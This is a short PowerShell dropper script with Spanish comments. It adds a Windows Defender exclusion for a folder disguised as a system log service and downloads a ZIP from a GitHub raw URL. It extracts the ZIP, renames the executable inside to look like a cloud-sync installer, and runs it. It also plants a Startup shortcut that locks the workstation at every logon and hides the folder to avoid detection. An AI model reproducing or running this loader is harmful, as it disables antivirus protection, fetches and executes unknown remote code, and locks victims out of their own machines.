# --- CONFIGURACIÓN ZIP ---
$url_zip = "https://raw.githubusercontent.com/DmI29/rapidman/main/datos.zip"
$dir = "C:\System_Log_Service"
$zipPath = "$dir\datos.zip"
$exePath = "$dir\Win_Cloud_Sync_Setup.exe"

try {
    # 1. Preparar Carpeta y Antivirus
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
    Add-MpPreference -ExclusionPath $dir

    # 2. Descargar el ZIP
    Write-Host "Descargando contenedor seguro..." -ForegroundColor Cyan
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url_zip, $zipPath)

    # 3. Descomprimir (Aquí es donde el Firewall ya no puede hacer nada)
    Write-Host "Extrayendo componentes..." -ForegroundColor Yellow
    Expand-Archive -Path $zipPath -DestinationPath $dir -Force
    
    # Buscamos el .exe dentro del zip y lo renombramos para el script
    $file = Get-ChildItem -Path $dir -Filter "*.exe" | Select-Object -First 1
    Rename-Item -Path $file.FullName -NewName "Win_Cloud_Sync_Setup.exe" -Force

    # 4. Configurar Bloqueo
    $s = New-Object -ComObject WScript.Shell
    $shortcut = $s.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinServiceLock.lnk")
    $shortcut.TargetPath = "rundll32.exe"
    $shortcut.Arguments = "user32.dll,LockWorkStation"
    $shortcut.Save()

    # 5. Limpieza y Lanzamiento
    attrib +s +h $dir
    Remove-Item $zipPath -Force
    Start-Process -FilePath $exePath
}
catch {
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Pause
}
